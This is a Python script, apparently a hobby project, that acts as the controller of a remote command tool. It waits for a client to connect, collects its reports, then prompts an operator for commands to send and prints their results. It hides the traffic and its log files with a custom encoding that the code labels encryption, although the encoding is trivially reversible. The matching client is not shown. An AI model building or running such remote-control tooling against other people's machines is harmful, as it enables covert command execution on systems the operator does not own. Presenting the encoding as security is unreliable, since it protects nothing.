#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: server.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Type: Build
    Build Version: 0.6
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk
'''

# Import needed core python modules

import time
import socket

from sys import argv
from os  import walk
from os  import path
from os  import mkdir

# Global Variables

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'\?!&+*|`^@[]=#~-_<>(){}§\"$%µ£¤ç "
bits_per_char = len(bin(len(characters))) - 2

# File Manager Functions

def getFilesInDir(dir):
    files = []

    for (dirpath, dirnames, filenames) in walk(dir):
        files.extend(filenames)

    return files

def getFileExtension(f):
    return f[-4:]

def fileExists(f):
    return path.isfile(f)

def createWritableFile(loc):
    f = open(loc, "w+")
    return f

# Hasing Functions

def modify(message):
    output = ""

    for l in message:
        index  = characters.find(l)
        index2 = len(characters) - 1 - index
        letter = characters[index2]
        output = output + letter
    
    return output

def longify(message):
    output = ""
    for char in message:
        bin_number = str(bin(characters.find(char)))[2:]
        for i in range(bits_per_char - len(bin_number)):
            bin_number = "0" + bin_number
        output = output + bin_number
    return output

def delongify(message):
    output = ""
    for i in range(int(len(message) / bits_per_char)):
        char   = int(message[i * bits_per_char:i * bits_per_char + bits_per_char], 2)
        output = output + characters[char]
    return output

def encrypt(message):
    output = modify(message)
    output = output[::-1]
    output = longify(output)
    return output

def decrypt(message):
    output = delongify(message)
    output = output[::-1]
    output = modify(output)
    return output

# Create Socket Connection

def createConnexion(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen()
    conn, addr = sock.accept()

    return (sock, conn, addr)

def getTime():
    return int(round(time.time() * 1000))

def send(data):
    conn.sendall(encrypt(str(data)).encode())

def receiveData():
    rcv = decrypt(conn.recv(1024).decode("utf-8", "ignore"))

    if rcv != "END":
        f.write(encrypt(rcv))
        f.write("\n")

    return rcv

def createLog():
    try:
        mkdir("logs")
        print("Created Log Folder")
    except FileExistsError:
        print("Log Folder Already Exists")
    
    logs = getFilesInDir("./logs/")
    biggest_number = 0
    hadANumber     = False

    for log in logs:
        log_number = int(log[4:-4])
        if hadANumber == True:
            if log_number > biggest_number:
                biggest_number = log_number
        else:
            biggest_number = log_number
            hadANumber = True

    log_number = biggest_number + 1

    file_name = "log_"+str(log_number)+".txt"
    f = createWritableFile("./logs/"+file_name)

    return f

# Ask for the port if it hasn't been given as a command line argument

PORT = 64500

if len(argv) > 1:
    PORT = int(argv[1])
else:
    PORT = int(input("On which port do you want the server to be created on ? : "))

sock, conn, addr = createConnexion("127.0.0.1", PORT)

f = createLog()
print("Created Log")

receivingInfo   = True
sendingCommands = False

while True:
    if receivingInfo:
        received = receiveData()
        if received != "END":
            print(received)
        else:
            receivingInfo   = False
            sendingCommands = True
        
    if sendingCommands:
        command = input("Command To Execute ")
        if command != "END":
            f.write(encrypt(command))
            f.write("\n")
            send(command)
            last_rcv_time = getTime()

            while True:
                current_time = getTime()
                if (current_time - last_rcv_time >= 2000):
                    break
                    
                received = receiveData()
                if received != "":
                    last_rcv_time = getTime()
                    if received != "END":
                        print(received)
                    else:
                        break
        else:
            send("END")
            f.close()
            sock.close()
            exit(0)